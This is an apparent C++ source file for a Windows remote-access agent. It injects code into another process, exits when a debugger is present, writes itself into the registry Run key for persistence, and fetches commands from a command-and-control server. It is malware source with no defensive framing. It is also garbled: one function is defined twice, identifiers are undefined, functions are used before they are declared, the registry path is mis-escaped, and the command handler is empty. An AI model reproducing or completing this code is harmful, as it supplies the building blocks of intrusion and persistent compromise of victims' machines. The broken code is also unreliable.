#include <iostream>                                              
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <cstring>
#include <windows.h>

// Function to inject code into another process
void inject_self(HANDLE process) {
    const SIZE_T agentSize = 4096;
    LPVOID remoteMemory = VirtualAllocEx(process, NULL, agentSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (remoteMemory) {
        const unsigned char payload[] = { 0x90, 0x90, 0xC3 }; // Simple NOP sled and RET instruction
        SIZE_T written;
        if (WriteProcessMemory(process, remoteMemory, payload, sizeof(payload), &written)) {
            HANDLE thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
            if (thread) {
                WaitForSingleObject(thread, INFINITE);
                CloseHandle(thread);
            } else {
                std::cerr << "Failed to create remote thread." << std::endl;
            }
        } else {
            std::cerr << "Failed to write to process memory." << std::endl;
        }
    } else {
        std::cerr << "Failed to allocate memory in remote process." << std::endl;
    }
}

int main() {
    // Anti-debugging routine
    anti_debug();

    // Function to persist the agent in the registry
    persist();

    // Communication with the C2 server
    communicate();

    // Open the target process
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234); // Replace 1234 with the actual process ID
    if (process) {
        inject_self(process);
        CloseHandle(process);
    } else {
        std::cerr << "Failed to open target process." << std::endl;
    }

    return 0;
}

// Function to perform anti-debugging
void anti_debug() {
    if (IsDebuggerPresent()) {
        ExitProcess(1); // Terminate if debugger is detected
    }
}

// Function to persist the agent in the registry
void persist() {
    char path[MAX_PATH];
    HKEY hKey;

    if (GetModuleFileName(NULL, path, sizeof(path))) {
        if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            if (RegSetValueEx(hKey, "MyAgent", 0, REG_SZ, (const BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
            } else {
                std::cerr << "Failed to set registry value for persistence." << std::endl;
            }
        } else {
            std::cerr << "Failed to open registry key for persistence." << std::endl;
        }
    } else {
        std::cerr << "Failed to get module file name." << std::endl;
    }
}

// Function to communicate with the C2 server
void communicate() {
    HINTERNET hInternet = InternetOpen(userAgent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            char buffer[1024];
            DWORD bytesRead;
            if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead)) {
                // Ensure to handle cases where bytesRead > buffer size
                if (bytesRead > 0) {
                    // Process commands from the server here
                }
            } else {
                std::cerr << "Failed to read from URL." << std::endl;
            }
            InternetCloseHandle(hConnect);
        } else {
            std::cerr << "Failed to open URL." << std::endl;
        }
        InternetCloseHandle(hInternet);
    } else {
        std::cerr << "Failed to initialize internet session." << std::endl;
    }
}

// Function to inject code into another process
void inject_self(HANDLE process) {
    const SIZE_T agentSize = 4096;
    LPVOID remoteMemory = VirtualAllocEx(process, NULL, agentSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (remoteMemory) {
        const unsigned char payload[] = { 0x90, 0x90, 0xC3 }; // Simple NOP sled and RET instruction
        SIZE_T written;
        if (WriteProcessMemory(process, remoteMemory, payload, sizeof(payload), &written)) {
            HANDLE thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
            if (thread) {
                WaitForSingleObject(thread, INFINITE);
                CloseHandle(thread);
            } else {
                std::cerr << "Failed to create remote thread." << std::endl;
            }
        } else {
            std::cerr << "Failed to write to process memory." << std::endl;
        }
    } else {
        std::cerr << "Failed to allocate memory in remote process." << std::endl;
    }
}

